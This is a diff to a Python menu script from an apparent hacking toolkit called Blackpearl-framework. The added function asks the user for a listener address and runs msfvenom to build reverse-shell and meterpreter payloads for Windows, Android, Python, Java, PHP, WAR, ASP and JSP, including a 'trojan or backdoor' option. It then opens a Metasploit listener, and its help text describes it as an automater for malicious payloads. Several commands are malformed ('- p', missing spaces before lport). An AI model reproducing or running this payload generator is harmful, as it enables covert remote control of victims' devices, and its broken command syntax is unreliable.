@@ -203,55 +203,131 @@ def randomlogo():
         sprint(logo)
 
 def msf():
+	print()
 	print("1.Install Metasploit Framework")
 	print("2.Metasploit Framework version")
 	print("3.Windows > payload.exe (payload and listener) ")
 	print("4.Android > payload.apk(Payload and listener)") 
 	print("5.Linux >  payload.py(payload and listener)")
 	print("6.MacOS > payload.jar(payload and listener)")
-	print("7.Web > payload.php(payload and listener)")
-	print("8.Simple TCP shell for PHP")
-	print("9.Simple TCP shell for WAR")
-	print("10.Simple TCP shell for ASP")
-	print("11.Simple TCP shell for javascript")
-	print("12.Trojan or backdoor for windows xp/7")
-	print("13.Harvest email using metasploit framework")
-	i = input("[msf>")
-	if i == '1':
-		print("Installing Metasploit Framework")
-		time.sleep(2)
+	print("7.Simple TCP shell for PHP")
+	print("8.Simple TCP shell for WAR")
+	print("9.Simple TCP shell for ASP")
+	print("10.Simple TCP shell for javascript")
+	print("11.Trojan or backdoor for windows xp/7")
+	print()
+	j = input("[pearl(msf)~> ")
+	if j == '1':
+		os.system("pkg install unstable-repo")
 		os.system("pkg install metasploit")
-	elif i == '2':
-		print("5.0.0 / January 10, 2019")
-	elif i == '3':
-		os.system("cd  ~/Blackpearl-framework/module;python windows.py")
-	elif i == '4':
-		os.system("cd  ~/Blackpearl-framework/module;python android.py")
-	elif i == '5':
-		os.system("cd  ~/Blackpearl-framework/module;python python.py")
-	elif i == '6':
-		os.system("cd  ~/Blackpearl-framework/module;python jar.py")
-	elif i == '7':
-		os.system("cd  ~/Blackpearl-framework/module;python  php.py")
-	elif i == '8':
-		os.system("cd  ~/Blackpearl-framework/module;python tp.py")
-	elif i == '9':
-		os.system("cd  ~/Blackpearl-framework/module;python war.py")
-	elif i == '10':
-		os.system("cd  ~/Blackpearl-framework/module;python sp.py")
-	elif i == '11':
-		os.system("cd  ~/Blackpearl-framework/module;python jsp.py")
-	elif i == '12':
-		os.system("cd  ~/Blackpearl-framework/module;python trojan.py")
-	elif i == '13':
-		os.system("cd  ~/Blackpearl-framework/module;python email.py")
-	elif i == 'back':
+		print()
+		print("Metasploit Framework Installed Successfully")
+		msf()
+	elif j == '2':
+		print()
+		print("Current MSF Version : 5.0.0 / Jan 10, 2019")
+		msf()
+	elif j == '3':
+		i = input("LHOST : ")
+		print()
+		print("Making Windows Payload....")
+		os.system("msfvenom - p windows/meterpreter/reverse_tcp lhost=" + i +  'lport=4444 - f exe > /sdcard/payload.exe')
+		print()
+		print("Payload Is Saved In Storage")
+		print()
+		print("Opening Metasploit Meterpreter")
+		print()
+		print("\n Use this after opening listener \n Steps  : \n 1.set payload windows/meterpreter/reverse_tcp \n 2.set lhost (your ip) \n 3.set lport 4444 \n 4.exploit")
+		print()
+		os.system("msfconsole -q -x 'use exploit/multi/handler ;'")
+	elif j == '4':
+		i = input("LHOST : ")
+		os.system("msfvenom -p android/meterpreter/reverse_tcp lhost=" + i + 'lport=4444 R > /sdcard/payload.apk')
+		print()
+		print("Payload Is Saved In Storage")
+		print()
+		print("Opening Metasploit Meterpreter")
+		print()
+		print("\n Use this after opening listener \n Steps  : \n 1.set payload android/meterpreter/reverse_tcp \n 2.set lhost (your ip) \n 3.set lport 4444 \n 4.exploit")
+		print()
+		os.system("msfconsole -q -x 'use exploit/multi/handler;'")
+	elif j == '5':
+		i = input("LHOST : ")
+		os.system("msfvenom - p python/meterpreter/reverse_tcp lhost=" + i +  'lport=4444 > /sdcard/payload.py')
+		print()
+		print("Payload Is Saved In Storage")
+		print()
+		print("Opening Metasploit Meterpreter")
+		print()
+		print("\n Use this after opening listener \n Steps  : \n 1.set payload python/meterpreter/reverse_tcp \n 2.set lhost (your ip) \n 3.set lport 4444 \n 4.exploit")
+		os.system("msfconsole -q -x 'use exploit/multi/handler ;'")
+	elif j == '6':
+		i = input("LHOST : ")
+		os.system("msfvenom - p windows/meterpreter/reverse_tcp lhost=" + i +  'lport=4444 - f jar > /sdcard/file.jar')
+		print()
+		print("Payload Is Saved In Storage")
+		print()
+		print("Opening Metasploit Meterpreter")
+		print()
+		print("\n Use this after opening listener \n Steps  : \n 1.set payload java/meterpreter/reverse_tcp \n 2.set lhost (your ip) \n 3.set lport 4444 \n 4.exploit")
+		os.system("msfconsole -q -x 'use exploit/multi/handler ;'")
+	elif j == '7':
+		i = input("LHOST : ")
+		print()
+		print("Making Payload....")
+		print()
+		os.system("msfvenom -p php/meterpreter_reverse_tcp LHOST=" + i + 'LPORT=4444 -f raw > file.php')
+		print()
+		print("Payload Is Saved In Storage")
+		msf()
+	elif j == '8':
+		i = input("LHOST : ")
+		print()
+		print("Making Payload..")
+		print()
+		os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + i + 'LPORT=4444 -f war > file.war')
+		print()
+		print("Payload Is Saved In Storage")
+		msf()
+	elif j == '9':
+		i = input("LHOST : ")
+		print()
+		print("Making Payload...")
+		print()
+		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + i + 'LPORT=4444 -f asp > file.asp')
+		print()
+		print("Payload Is Saved In Storage")
+		msf()
+	elif j == '10':
+		i = input("LHOST : ")
+		print()
+		print("Making Payload...")
+		print()
+		os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=" + i + 'LPORT=4444 -f raw > file.jsp')
+		print()
+		print("Payload Saved In Storage")
+		msf()
+	elif j == '11':
+		i = input("LHOST : ")
+		print()
+		print("Making Payload....")
+		print()
+		os.system("msfvenom windows/meterpreter/reverse_tcp LHOST=" + i + 'LPORT=6666 x > /sdcard/trojan.exe')
+		print()
+		print("Payload Is Saved In Storage")
+		print()
+		print("Opening Metasploit Meterpreter")
+		print()
+		print("\n Use this after opening listener \n Steps  : \n 1.set payload windows/meterpreter/reverse_tcp \n 2.set lhost (your ip) \n 3.set lport 6666 \n 4.exploit")
+		os.system("msfconsole -q -x 'use exploit/multi/handler ;'")
+	elif j == 'help':
+		print("\n This is an automater for making different malicious payloads for exploiting different system using metasploit framework project. \n Use different numbers corresponding to different options for using them. \n back - To go back to pearl console \n")
+	elif j == 'back':
 		main()
-	elif i == 'help':
-	    print("This for exploiting a system")
 	else:
-	    print("[!] Invalid input")
-	    main()
+		print("[!] Invalid input")
+		print("[!] Try again")
+		msf()
 
 def nmap():
 	print()
